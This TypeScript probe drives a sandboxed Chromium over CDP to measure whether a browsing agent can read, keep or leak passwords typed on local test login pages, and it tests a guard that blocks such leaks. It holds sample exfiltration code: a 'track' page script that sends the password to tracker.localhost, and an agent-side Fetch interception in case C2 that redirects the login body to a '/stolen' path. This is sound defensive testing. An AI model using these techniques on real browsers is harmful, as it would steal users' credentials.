// The probe of the stored sign-in credentials design (board ab-v16.95). Not product code, not part of npm test.
// Linux only. It starts its own Xvfb on display 175 (its own X authority) and its own Chromium on a temp profile with
// --remote-debugging-pipe (no port), serves local pages on login.localhost and tracker.localhost only (every other
// host maps to nothing, and the proxy is a closed local port), and uses only fake values that it makes itself. It
// prints booleans and counts only, never a value. It removes its own temp profiles and stops its own processes.
//
//   node probe.ts --out-dir DIR [--display 175] [--chrome /usr/bin/chromium]

import { spawn, execFileSync, type ChildProcess } from "node:child_process";
import { createServer, type IncomingMessage, type ServerResponse } from "node:http";
import { randomBytes } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, openSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { join, relative, resolve } from "node:path";
import { parseArgs } from "node:util";
import type { Readable, Writable } from "node:stream";
import { harnessGuard, reservedDisplay } from "../../../../test/live/guard.ts";

const { values } = parseArgs({ options: { "out-dir": { type: "string" }, display: { type: "string" }, chrome: { type: "string" } } });
const refuse = (m: string): never => { process.stderr.write(`probe: ${m}\n`); process.exit(2); };
if (!values["out-dir"]) refuse("usage: node probe.ts --out-dir DIR [--display 175]");
if (process.platform !== "linux") refuse("linux only");
const DISPLAY = Number(values.display ?? 175);
if (DISPLAY !== 175) refuse("this probe runs on display 175 only");
const r = reservedDisplay(DISPLAY, "--display"); if (r) refuse(r);
const CHROME = values.chrome ?? "/usr/bin/chromium";
const OUT = resolve(values["out-dir"]!);
mkdirSync(OUT, { recursive: true });
const RUN = mkdtempSync(join(OUT, "run-"));
const sleep = (ms: number) => new Promise((res) => setTimeout(res, ms));
const say = (l: string) => process.stderr.write(`${new Date().toISOString().slice(11, 23)} ${l}\n`);

// ---------------------------------------------------------------- the fake values (made here, never printed)
const U = `probe-user-${randomBytes(4).toString("hex")}`;
const P = `Pw-${randomBytes(12).toString("base64url")}`; // US-layout characters only
const W = `Wrong-${randomBytes(9).toString("base64url")}`;
const forms = (s: string) => [s, encodeURIComponent(s), JSON.stringify(s).slice(1, -1), Buffer.from(s).toString("base64")];
const holds = (text: string | undefined | null, s: string) => !!text && forms(s).some((f) => text.includes(f));

// ---------------------------------------------------------------- processes, guard, Xvfb
const children: ChildProcess[] = [];
const pidFile = join(OUT, "pids.txt");
const track = (c: ChildProcess, what: string) => { children.push(c); writeFileSync(pidFile, `${c.pid} ${what}\n`, { flag: "a" }); harness.track(c.pid, what); };
process.on("exit", () => {
  for (const c of children.reverse()) if (c.exitCode === null && c.signalCode === null) c.kill("SIGTERM");
  rmSync(RUN, { recursive: true, force: true }); // the probe's own temp profiles and X authority
});
for (const sig of ["SIGINT", "SIGTERM"] as const) process.on(sig, () => process.exit(130));
const harness = await harnessGuard("ab-v16-95-credentials-probe");
if (existsSync(`/tmp/.X11-unix/X${DISPLAY}`) || existsSync(`/tmp/.X${DISPLAY}-lock`)) refuse(`display :${DISPLAY} is in use`);
const field = (b: Buffer) => { const n = Buffer.alloc(2); n.writeUInt16BE(b.length); return Buffer.concat([n, b]); };
const xauth = join(RUN, "Xauthority");
writeFileSync(xauth, Buffer.concat([Buffer.from([0xff, 0xff]), field(Buffer.alloc(0)), field(Buffer.from(String(DISPLAY))),
  field(Buffer.from("MIT-MAGIC-COOKIE-1")), field(randomBytes(16))]), { mode: 0o600 });
const xvfb = spawn("Xvfb", [`:${DISPLAY}`, "-auth", xauth, "-nolisten", "tcp", "-screen", "0", "1280x900x24"], { stdio: "ignore" });
track(xvfb, "Xvfb");
for (let i = 0; i < 50 && !existsSync(`/tmp/.X11-unix/X${DISPLAY}`) && xvfb.exitCode === null; i++) await sleep(100);
await sleep(300);
if (xvfb.exitCode !== null) refuse("Xvfb did not start");
const XENV: NodeJS.ProcessEnv = { ...process.env, DISPLAY: `:${DISPLAY}`, XAUTHORITY: xauth };
delete XENV.WAYLAND_DISPLAY; delete XENV.XDG_SESSION_TYPE;
say(`Xvfb :${DISPLAY} pid ${xvfb.pid}`);

// ---------------------------------------------------------------- the local server
const tracker = { requests: 0, withSecret: 0 };
const sessions = new Set<string>();
const body = (req: IncomingMessage) => new Promise<string>((res) => { let b = ""; req.setEncoding("utf8"); req.on("data", (d) => (b += d)); req.on("end", () => res(b)); });
const SHOW = `<script>addEventListener('pageshow', (e) => { window.__persisted = e.persisted; window.__shows = (window.__shows || 0) + 1; });</script>`;
const form = (v: string, action: string, uval = "", pval = "", note = "") => `<!doctype html><html><head><meta charset=utf-8><title>login ${v}</title>${SHOW}</head><body>
<p id=note>${note}</p>
<form id=f method=post action="${action}">
 <label>User <input id=u name=username autocomplete=username value="${uval}"></label><br>
 <label>Password <input id=p name=password type=password autocomplete=current-password value="${pval}"></label><br>
 <button id=go type=submit>Sign in</button>
</form>
${v === "sync" ? `<script>for (const el of document.querySelectorAll('input')) el.addEventListener('input', () => el.setAttribute('value', el.value));</script>` : ""}
${v === "track" ? `<script>document.getElementById('f').addEventListener('submit', () => {
  const u = document.getElementById('u').value, p = document.getElementById('p').value;
  fetch('http://tracker.localhost:${PORT_PH}/collect', { method: 'POST', mode: 'no-cors', body: JSON.stringify({ u, p }), keepalive: true });
  new Image().src = 'http://tracker.localhost:${PORT_PH}/px?d=' + btoa(p);
});</script>` : ""}
</body></html>`;
const PORT_PH = "__PORT__";
const SPA = `<!doctype html><html><head><meta charset=utf-8><title>spa</title>${SHOW}</head><body>
<p id=note></p><div id=box><input id=u autocomplete=username> <input id=p type=password autocomplete=current-password> <button id=go>Sign in</button></div>
<script>
document.getElementById('go').addEventListener('click', async () => {
  const r = await fetch('/api/session', { method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ username: document.getElementById('u').value, password: document.getElementById('p').value }) });
  if (r.ok) { history.pushState({}, '', '/spa-home'); document.getElementById('box').style.display = 'none'; document.getElementById('note').textContent = 'signed in'; }
  else document.getElementById('note').textContent = 'wrong';
});
</script></body></html>`;
let PORT = 0;
const server = createServer(async (req: IncomingMessage, res: ServerResponse) => {
  const host = (req.headers.host ?? "").split(":")[0];
  const url = new URL(req.url ?? "/", "http://x");
  const send = (code: number, html: string, headers: Record<string, string> = {}) => { res.writeHead(code, { "content-type": "text/html; charset=utf-8", ...headers }); res.end(html.replaceAll(PORT_PH, String(PORT))); };
  if (host === "tracker.localhost") {
    const b = await body(req);
    tracker.requests++;
    if (holds(b, P) || holds(decodeURIComponent(req.url ?? ""), P)) tracker.withSecret++;
    res.writeHead(204); res.end(); return;
  }
  if (host !== "login.localhost") { res.writeHead(404); res.end(); return; }
  const signedIn = (req.headers.cookie ?? "").split(/;\s*/).some((c) => sessions.has(c.replace(/^sid=/, "")));
  if (req.method === "GET" && url.pathname === "/login") {
    const v = url.searchParams.get("v") ?? "plain";
    if (v === "spa") return send(200, SPA);
    const action = v === "echo" ? "/session?echo=1" : "/session";
    return send(200, form(v, action), v === "nostore" ? { "cache-control": "no-store" } : {});
  }
  if (req.method === "POST" && url.pathname === "/session") {
    const f = new URLSearchParams(await body(req));
    if (f.get("username") === U && f.get("password") === P) {
      const sid = randomBytes(8).toString("hex"); sessions.add(sid);
      res.writeHead(303, { location: "/home", "set-cookie": `sid=${sid}; Path=/; HttpOnly` }); res.end(); return;
    }
    const echo = url.searchParams.get("echo") === "1";
    return send(200, form("plain", "/session", echo ? f.get("username") ?? "" : "", echo ? f.get("password") ?? "" : "", "wrong"));
  }
  if (req.method === "POST" && url.pathname === "/api/session") {
    const j = JSON.parse((await body(req)) || "{}");
    if (j.username === U && j.password === P) {
      const sid = randomBytes(8).toString("hex"); sessions.add(sid);
      res.writeHead(200, { "content-type": "application/json", "set-cookie": `sid=${sid}; Path=/; HttpOnly` }); res.end("{}"); return;
    }
    res.writeHead(401, { "content-type": "application/json" }); res.end("{}"); return;
  }
  if (url.pathname === "/home") return send(200, `<!doctype html><title>home</title>${SHOW}<p id=state>${signedIn ? "signed in" : "not signed in"}</p>`);
  if (url.pathname === "/other") return send(200, `<!doctype html><title>other</title><p>another page of the origin</p>`);
  res.writeHead(404); res.end();
});
await new Promise<void>((res) => server.listen(0, "127.0.0.1", () => res()));
PORT = (server.address() as { port: number }).port;
const ORIGIN = `http://login.localhost:${PORT}`;
say(`server on 127.0.0.1:${PORT}`);

// ---------------------------------------------------------------- Chromium over a pipe, a small CDP client
type Ev = { method: string; params: any; sessionId?: string };
class Chrome {
  proc: ChildProcess; dir: string;
  private buf = ""; private next = 1;
  private pending = new Map<number, (m: any) => void>();
  listeners: ((e: Ev) => void)[] = [];
  constructor(name: string, prefs?: object) {
    this.dir = join(RUN, `profile-${name}`);
    mkdirSync(join(this.dir, "Default"), { recursive: true });
    if (prefs) writeFileSync(join(this.dir, "Default", "Preferences"), JSON.stringify(prefs));
    const log = openSync(join(RUN, `chrome-${name}.log`), "a");
    const args = ["--remote-debugging-pipe", "--no-first-run", "--no-default-browser-check", "--ozone-platform=x11", "--password-store=basic",
      "--disable-background-networking", "--disable-component-update", "--disable-sync", "--disable-default-apps",
      "--host-resolver-rules=MAP * ~NOTFOUND , EXCLUDE login.localhost , EXCLUDE tracker.localhost", "--proxy-server=http://127.0.0.1:9",
      "--proxy-bypass-list=login.localhost;tracker.localhost", "--window-position=0,0", "--window-size=1200,850", `--user-data-dir=${this.dir}`, "about:blank"];
    this.proc = spawn(CHROME, args, { env: XENV, stdio: ["ignore", log, log, "pipe", "pipe"] });
    track(this.proc, `chromium-${name}`);
    const rd = this.proc.stdio[4] as Readable;
    rd.setEncoding("utf8");
    rd.on("data", (d: string) => {
      this.buf += d;
      for (let i; (i = this.buf.indexOf("\0")) >= 0;) {
        const m = JSON.parse(this.buf.slice(0, i)); this.buf = this.buf.slice(i + 1);
        if (m.id !== undefined) { this.pending.get(m.id)?.(m); this.pending.delete(m.id); }
        else for (const l of [...this.listeners]) l(m);
      }
    });
  }
  send(method: string, params: object = {}, sessionId?: string): Promise<any> {
    const id = this.next++;
    return new Promise((res, rej) => {
      const t = setTimeout(() => { this.pending.delete(id); rej(new Error(`timeout ${method}`)); }, 20000);
      this.pending.set(id, (m) => { clearTimeout(t); m.error ? rej(new Error(`${method}: ${m.error.message}`)) : res(m.result); });
      (this.proc.stdio[3] as Writable).write(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }) + "\0");
    });
  }
  waitFor(pred: (e: Ev) => boolean, ms = 10000): Promise<Ev | null> {
    return new Promise((res) => {
      const t = setTimeout(() => { this.listeners = this.listeners.filter((x) => x !== l); res(null); }, ms);
      const l = (e: Ev) => { if (pred(e)) { clearTimeout(t); this.listeners = this.listeners.filter((x) => x !== l); res(e); } };
      this.listeners.push(l);
    });
  }
  async close() {
    try { await this.send("Browser.close"); } catch { /* it may close before it answers */ }
    for (let i = 0; i < 100 && this.proc.exitCode === null && this.proc.signalCode === null; i++) await sleep(100);
    if (this.proc.exitCode === null && this.proc.signalCode === null) this.proc.kill("SIGTERM");
    await sleep(500);
  }
}

async function newTab(c: Chrome, newWindow = false) {
  const { targetId } = await c.send("Target.createTarget", { url: "about:blank", newWindow });
  return targetId as string;
}
async function attach(c: Chrome, targetId: string) {
  const { sessionId } = await c.send("Target.attachToTarget", { targetId, flatten: true });
  await c.send("Page.enable", {}, sessionId);
  await c.send("Runtime.enable", {}, sessionId);
  await c.send("Emulation.setFocusEmulationEnabled", { enabled: true }, sessionId);
  return sessionId as string;
}
async function goto(c: Chrome, s: string, url: string) {
  const loaded = c.waitFor((e) => e.sessionId === s && e.method === "Page.loadEventFired", 10000);
  await c.send("Page.navigate", { url }, s);
  await loaded; await sleep(200);
}
async function evaluate(c: Chrome, s: string, expression: string, contextId?: number) {
  const r = await c.send("Runtime.evaluate", { expression, returnByValue: true, awaitPromise: true, ...(contextId ? { contextId } : {}) }, s);
  return r.result?.value;
}
async function click(c: Chrome, s: string, sel: string, ctx?: number) {
  const b = await evaluate(c, s, `(() => { const r = document.querySelector(${JSON.stringify(sel)}).getBoundingClientRect(); return { x: r.x + r.width / 2, y: r.y + r.height / 2 }; })()`, ctx);
  for (const type of ["mouseMoved", "mousePressed", "mouseReleased"]) {
    await c.send("Input.dispatchMouseEvent", { type, x: b.x, y: b.y, button: type === "mouseMoved" ? "none" : "left", buttons: type === "mousePressed" ? 1 : 0, clickCount: 1 }, s);
    await sleep(30);
  }
}
async function typeText(c: Chrome, s: string, text: string) {
  for (const ch of text) {
    await c.send("Input.dispatchKeyEvent", { type: "keyDown", key: ch, text: ch, unmodifiedText: ch }, s);
    await c.send("Input.dispatchKeyEvent", { type: "keyUp", key: ch }, s);
    await sleep(8);
  }
}
async function enter(c: Chrome, s: string) {
  await c.send("Input.dispatchKeyEvent", { type: "keyDown", key: "Enter", code: "Enter", windowsVirtualKeyCode: 13, text: "\r" }, s);
  await c.send("Input.dispatchKeyEvent", { type: "keyUp", key: "Enter", code: "Enter", windowsVirtualKeyCode: 13 }, s);
}
async function fill(c: Chrome, s: string, user: string, pass: string, ctx?: number) {
  await click(c, s, "#u", ctx); await typeText(c, s, user);
  await click(c, s, "#p", ctx); await typeText(c, s, pass);
}
const pathOf = async (c: Chrome, s: string) => await evaluate(c, s, "location.pathname");
async function waitPath(c: Chrome, s: string, path: string, ms = 8000) {
  for (let t = 0; t < ms; t += 100) { try { if (await pathOf(c, s) === path && await evaluate(c, s, "document.readyState") === "complete") return true; } catch { /* navigating */ } await sleep(100); }
  return false;
}

// ---------------------------------------------------------------- the scan of a profile folder (plain bytes)
function scan(dir: string) {
  const hits: Record<string, string[]> = { password: [], username: [] };
  const walk = (d: string) => {
    for (const n of readdirSync(d)) {
      const p = join(d, n);
      let st; try { st = statSync(p); } catch { continue; }
      if (st.isDirectory()) walk(p);
      else if (st.isFile() && st.size < 64 * 1024 * 1024) {
        let b: Buffer; try { b = readFileSync(p); } catch { continue; }
        if (forms(P).some((f) => b.includes(Buffer.from(f)))) hits.password.push(relative(dir, p));
        if (b.includes(Buffer.from(U))) hits.username.push(relative(dir, p));
      }
    }
  };
  walk(dir);
  return hits;
}
function sqlCount(db: string, sql: string, arg: string): number | string {
  if (!existsSync(db)) return "no file";
  try { return Number(execFileSync("python3", ["-c", "import sqlite3,sys; c=sqlite3.connect('file:'+sys.argv[1]+'?mode=ro', uri=True); print(c.execute(sys.argv[2], (sys.argv[3],)).fetchone()[0])", db, sql, arg], { encoding: "utf8" }).trim()); }
  catch (e) { return `error ${(e as Error).message.split("\n")[0]}`; }
}
function profileFacts(dir: string) {
  return {
    login_data_rows_with_username: sqlCount(join(dir, "Default", "Login Data"), "select count(*) from logins where username_value = ?", U),
    web_data_autofill_rows_with_username: sqlCount(join(dir, "Default", "Web Data"), "select count(*) from autofill where value = ?", U),
    web_data_autofill_rows_with_password: sqlCount(join(dir, "Default", "Web Data"), "select count(*) from autofill where value = ?", P),
    files_with_plain_bytes: scan(dir),
  };
}

const out: Record<string, any> = { chrome: "", cases: {} };

// ================================================================ profile 1: what an agent's CDP session can read
{
  const c = new Chrome("threats");
  const ver = await c.send("Browser.getVersion"); out.chrome = ver.product;
  await c.send("Target.setDiscoverTargets", { discover: true });
  const res: Record<string, any> = {};
  // C1: a fill by Input events in a tab where the agent has its own session (G) next to the filler's (S)
  {
    const t = await newTab(c); const S = await attach(c, t); const G = await attach(c, t);
    await c.send("Network.enable", {}, G);
    const posts: any[] = [];
    c.listeners.push((e) => { if (e.sessionId === G && e.method === "Network.requestWillBeSent" && e.params.request.method === "POST") posts.push(e.params); });
    await goto(c, S, `${ORIGIN}/login?v=plain`);
    await fill(c, S, U, P);
    const value = await evaluate(c, G, "document.querySelector('#p').value");
    const { root } = await c.send("DOM.getDocument", { depth: -1 }, G);
    const { nodeId } = await c.send("DOM.querySelector", { nodeId: root.nodeId, selector: "#p" }, G);
    const outer = (await c.send("DOM.getOuterHTML", { nodeId }, G)).outerHTML;
    const snap = await c.send("DOMSnapshot.captureSnapshot", { computedStyles: [] }, G);
    const ax = await c.send("Accessibility.getFullAXTree", {}, G).catch((e: Error) => ({ error: e.message }));
    const shot = await c.send("Page.captureScreenshot", { format: "png" }, G);
    await enter(c, S);
    const home = await waitPath(c, S, "/home");
    let post = posts.find((p) => p.request.url.endsWith("/session"));
    let bodyText: string | undefined = post?.request.postData;
    if (post && !bodyText && post.request.hasPostData) bodyText = (await c.send("Network.getRequestPostData", { requestId: post.requestId }, G).catch(() => ({}))).postData;
    res.C1_fill_then_read = {
      runtime_evaluate_value: value === P, dom_outer_html_attribute: holds(outer, P), domsnapshot_strings: JSON.stringify(snap.strings ?? []).includes(P),
      ax_tree: holds(JSON.stringify(ax), P), screenshot_bytes: shot.data.length > 0, network_post_body: holds(bodyText, P),
      post_body_in_event_itself: holds(post?.request.postData, P), signed_in_after_enter: home,
    };
    // C3: history.back() after the sign-in: the back-forward cache
    await evaluate(c, G, "history.back()").catch(() => {});
    const back = await waitPath(c, G, "/login");
    await sleep(300);
    res.C3_back_after_sign_in = { back_to_login: back, restored_from_bfcache: await evaluate(c, G, "window.__persisted === true"), password_value_after_back: (await evaluate(c, G, "document.querySelector('#p') && document.querySelector('#p').value")) === P };
    await c.send("Target.closeTarget", { targetId: t });
  }
  // C3b: the same, with Page.resetNavigationHistory before the agent's history.back()
  {
    const t = await newTab(c); const S = await attach(c, t); const G = await attach(c, t);
    await goto(c, S, `${ORIGIN}/login?v=plain`); await fill(c, S, U, P); await enter(c, S); const home = await waitPath(c, S, "/home");
    const reset = await c.send("Page.resetNavigationHistory", {}, S).then(() => true, (e: Error) => e.message);
    const hist = await evaluate(c, G, "history.length");
    await evaluate(c, G, "history.back()").catch(() => {});
    await sleep(1500);
    res.C3b_reset_history_then_back = { signed_in: home, reset_ok: reset, history_length_after_reset: hist, path_after_back: await pathOf(c, G), password_reachable: (await evaluate(c, G, "!!document.querySelector('#p') && document.querySelector('#p').value.length > 0")) === true };
    await c.send("Target.closeTarget", { targetId: t });
  }
  // C3c: a login page with Cache-Control: no-store
  {
    const t = await newTab(c); const S = await attach(c, t); const G = await attach(c, t);
    await goto(c, S, `${ORIGIN}/login?v=nostore`); await fill(c, S, U, P); await enter(c, S); await waitPath(c, S, "/home");
    await evaluate(c, G, "history.back()").catch(() => {}); await waitPath(c, G, "/login"); await sleep(300);
    res.C3c_no_store_back = { restored_from_bfcache: await evaluate(c, G, "window.__persisted === true"), password_value_after_back: (await evaluate(c, G, "document.querySelector('#p') && document.querySelector('#p').value")) === P };
    await c.send("Target.closeTarget", { targetId: t });
  }
  // C4: a failed sign-in: a server form that is empty again, and one that echoes the value
  for (const v of ["plain", "echo"]) {
    const t = await newTab(c); const S = await attach(c, t); const G = await attach(c, t);
    await goto(c, S, `${ORIGIN}/login?v=${v}`); await fill(c, S, U, W); await enter(c, S);
    await sleep(1500);
    res[`C4_failed_sign_in_${v}`] = { wrong_note_shown: (await evaluate(c, G, "document.getElementById('note').textContent")) === "wrong", password_value_left: (await evaluate(c, G, "document.querySelector('#p').value")) === W };
    await c.send("Target.closeTarget", { targetId: t });
  }
  // C5: a script-driven sign-in (fetch): a failure keeps the field; a success hides the form but keeps the value
  {
    const t = await newTab(c); const S = await attach(c, t); const G = await attach(c, t);
    await goto(c, S, `${ORIGIN}/login?v=spa`); await fill(c, S, U, W); await click(c, S, "#go"); await sleep(800);
    const failKept = (await evaluate(c, G, "document.querySelector('#p').value")) === W;
    await c.send("Target.closeTarget", { targetId: t });
    const t2 = await newTab(c); const S2 = await attach(c, t2); const G2 = await attach(c, t2);
    await goto(c, S2, `${ORIGIN}/login?v=spa`); await fill(c, S2, U, P); await click(c, S2, "#go"); await sleep(800);
    res.C5_script_sign_in = { failure_value_left: failKept, success_note: (await evaluate(c, G2, "document.getElementById('note').textContent")) === "signed in",
      success_same_document_value_left: (await evaluate(c, G2, "document.querySelector('#p').value")) === P };
    await c.send("Target.closeTarget", { targetId: t2 });
  }
  // C6: a page script that copies the value into the value attribute (as some frameworks do)
  {
    const t = await newTab(c); const S = await attach(c, t); const G = await attach(c, t);
    await goto(c, S, `${ORIGIN}/login?v=sync`);
    const { root } = await c.send("DOM.getDocument", { depth: -1 }, G);
    const attrEvents: any[] = [];
    c.listeners.push((e) => { if (e.sessionId === G && e.method === "DOM.attributeModified") attrEvents.push(e.params); });
    await fill(c, S, U, P); await sleep(300);
    const { nodeId } = await c.send("DOM.querySelector", { nodeId: root.nodeId, selector: "#p" }, G);
    res.C6_attribute_copy = { outer_html: holds((await c.send("DOM.getOuterHTML", { nodeId }, G)).outerHTML, P), attribute_event: attrEvents.some((a) => holds(a.value, P)) };
    await c.send("Target.closeTarget", { targetId: t });
  }
  // C7: scripts that the agent puts in first: a main-world listener, an isolated-world init script, and a window
  // reference (the agent's page opened the login page itself)
  {
    const t = await newTab(c); const S = await attach(c, t); const G = await attach(c, t);
    await c.send("Page.addScriptToEvaluateOnNewDocument", { source: "document.addEventListener('input', (e) => { window.__glog = e.target.value; }, true);", worldName: "agentworld" }, G);
    let ctx = 0;
    c.listeners.push((e) => { if (e.sessionId === G && e.method === "Runtime.executionContextCreated" && e.params.context.name === "agentworld") ctx = e.params.context.id; });
    await goto(c, S, `${ORIGIN}/login?v=plain`);
    await evaluate(c, G, "window.__log = ''; document.addEventListener('input', (e) => { window.__log = e.target.value; }, true); true");
    await fill(c, S, U, P); await sleep(200);
    const main = (await evaluate(c, G, "window.__log")) === P;
    const iso = ctx ? (await evaluate(c, G, "window.__glog", ctx)) === P : "no context";
    await c.send("Target.closeTarget", { targetId: t });
    // the window reference
    const a = await newTab(c); const GA = await attach(c, a);
    await goto(c, GA, `${ORIGIN}/other`);
    const popup = c.waitFor((e) => e.method === "Target.targetCreated" && e.params.targetInfo.type === "page" && e.params.targetInfo.openerId === a, 5000);
    await c.send("Runtime.evaluate", { expression: `window.__w = window.open('${ORIGIN}/login?v=plain', '_blank'); true`, userGesture: true, returnByValue: true }, GA);
    const pe = await popup;
    let viaRef: boolean | string = "no popup";
    if (pe) {
      const SP = await attach(c, pe.params.targetInfo.targetId);
      await waitPath(c, SP, "/login");
      await fill(c, SP, U, P); await sleep(200);
      viaRef = (await evaluate(c, GA, "window.__w.document.querySelector('#p').value")) === P;
      await c.send("Target.closeTarget", { targetId: pe.params.targetInfo.targetId });
    }
    await c.send("Target.closeTarget", { targetId: a });
    res.C7_agent_scripts_first = { main_world_listener: main, isolated_world_init_script: iso, window_reference_of_opener: viaRef };
  }
  // C2: the agent's own interception of the submit: it reads the body and sends it to another host
  {
    const t = await newTab(c); const S = await attach(c, t); const G = await attach(c, t);
    await goto(c, S, `${ORIGIN}/login?v=plain`);
    await c.send("Fetch.enable", { patterns: [{ urlPattern: "*/session*", requestStage: "Request" }] }, G);
    let read = false, redirected: boolean | string = false;
    const before = tracker.withSecret;
    c.listeners.push((e) => {
      if (e.sessionId !== G || e.method !== "Fetch.requestPaused") return;
      read = holds(e.params.request.postData, P);
      c.send("Fetch.continueRequest", { requestId: e.params.requestId, url: `http://tracker.localhost:${PORT}/stolen` }, G).then(() => { redirected = true; }, (err: Error) => { redirected = err.message; });
    });
    await fill(c, S, U, P); await enter(c, S); await sleep(1500);
    res.C2_agent_interception = { body_read: read, continue_to_other_host: redirected, tracker_got_the_secret: tracker.withSecret > before };
    await c.send("Fetch.disable", {}, G).catch(() => {});
    await c.send("Target.closeTarget", { targetId: t });
  }
  out.cases.profile1 = res;
  await c.close();
  out.cases.profile1_disk = profileFacts(c.dir);
}

// ================================================================ the act: a private tab, the secret guard, the clean end
async function act(c: Chrome, variant: string) {
  const t0 = Date.now();
  const t = await newTab(c, true);
  const S = await attach(c, t);
  const blocked: string[] = []; let continued = 0;
  await c.send("Fetch.enable", { patterns: [{ urlPattern: "*", requestStage: "Request" }] }, S);
  c.listeners.push((e) => {
    if (e.sessionId !== S || e.method !== "Fetch.requestPaused") return;
    const rq = e.params.request; const sameOrigin = rq.url.startsWith(`${ORIGIN}/`);
    const unknownBody = rq.hasPostData && rq.postData === undefined;
    const inUrl = holds(decodeURIComponent(rq.url), P);
    if (inUrl || (!sameOrigin && (holds(rq.postData, P) || unknownBody))) {
      blocked.push(new URL(rq.url).host);
      c.send("Fetch.failRequest", { requestId: e.params.requestId, errorReason: "BlockedByClient" }, S).catch(() => {});
    } else { continued++; c.send("Fetch.continueRequest", { requestId: e.params.requestId }, S).catch(() => {}); }
  });
  await goto(c, S, `${ORIGIN}/login?v=${variant}`);
  const { frameTree } = await c.send("Page.getFrameTree", {}, S);
  const { executionContextId: ctx } = await c.send("Page.createIsolatedWorld", { frameId: frameTree.frame.id, worldName: "signin" }, S);
  const formFacts = await evaluate(c, S, `(() => { const f = document.querySelector('input[type=password]').form; return { origin: location.origin, method: f.method, action: new URL(f.action).origin, passwords: document.querySelectorAll('input[type=password]').length }; })()`, ctx);
  await fill(c, S, U, P, ctx);
  await click(c, S, "#go", ctx);
  const home = await waitPath(c, S, "/home");
  const after = await evaluate(c, S, "document.querySelectorAll('input[type=password]').length");
  await evaluate(c, S, "for (const el of document.querySelectorAll('input')) el.value = ''; true", ctx).catch(() => {});
  const reset = await c.send("Page.resetNavigationHistory", {}, S).then(() => true, (e: Error) => e.message);
  await c.send("Target.closeTarget", { targetId: t });
  return { form_checks: { same_origin: formFacts.origin === ORIGIN, method_post: formFacts.method === "post", action_same_origin: formFacts.action === ORIGIN, one_password_field: formFacts.passwords === 1 },
    signed_in: home && after === 0, blocked_hosts: blocked, continued_requests: continued, reset_history: reset, ms: Date.now() - t0 };
}

// ================================================================ profile 2: the act alone, Chrome's defaults
{
  const before = tracker.withSecret;
  const c = new Chrome("act-defaults");
  const res = await act(c, "track");
  // the agent's own tab gets the signed-in page (the cookie is in the profile)
  const a = await newTab(c); const G = await attach(c, a); await goto(c, G, `${ORIGIN}/home`);
  out.cases.profile2_act = { ...res, tracker_got_the_secret: tracker.withSecret > before, agent_tab_signed_in: (await evaluate(c, G, "document.getElementById('state').textContent")) === "signed in" };
  await c.close();
  out.cases.profile2_disk = profileFacts(c.dir);
}

// ================================================================ profile 3: the act alone, password saving and autofill off
{
  const c = new Chrome("act-prefs-off", { credentials_enable_service: false, profile: { password_manager_enabled: false, password_manager_leak_detection: false },
    autofill: { enabled: false, profile_enabled: false, credit_card_enabled: false } });
  const res = await act(c, "plain");
  out.cases.profile3_act = res;
  await c.close();
  out.cases.profile3_disk = profileFacts(c.dir);
  const prefs = JSON.parse(readFileSync(join(c.dir, "Default", "Preferences"), "utf8"));
  out.cases.profile3_prefs_kept = { credentials_enable_service: prefs.credentials_enable_service, autofill_profile_enabled: prefs.autofill?.profile_enabled };
}

out.tracker = { requests: tracker.requests };
writeFileSync(join(OUT, "results.json"), JSON.stringify(out, null, 2) + "\n");
process.stdout.write(JSON.stringify(out, null, 2) + "\n");
server.close();
process.exit(0);
